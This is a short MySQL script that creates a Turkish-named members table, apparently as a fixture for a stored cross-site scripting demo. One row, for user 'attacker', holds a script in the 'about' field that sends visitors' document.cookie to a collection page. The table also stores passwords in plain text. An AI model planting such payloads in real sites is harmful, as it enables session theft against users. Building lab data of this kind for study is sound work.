CREATE DATABASE test1;
use test1
CREATE TABLE `uyeler` (
  `id` int(11) NOT NULL AUTO_INCREMENT,
  `kadi` varchar(255) NOT NULL,
  `sifre` varchar(255) NOT NULL,
  `eposta` varchar(255) NOT NULL,
  `hakkinda` text NOT NULL,
  PRIMARY KEY (`id`)
) ENGINE=InnoDB DEFAULT CHARSET=utf8;

INSERT INTO `uyeler` (`id`, `kadi`, `sifre`, `eposta`, `hakkinda`)
VALUES
	(1,'ayberk','123123','ayberkctl@gmail.com','hakkımda'),
	(2,'attacker','122','attacker@attacker.com','<script>window.location.href = \'cookie/cookie.php?cookie=\' + document.cookie;</script>');

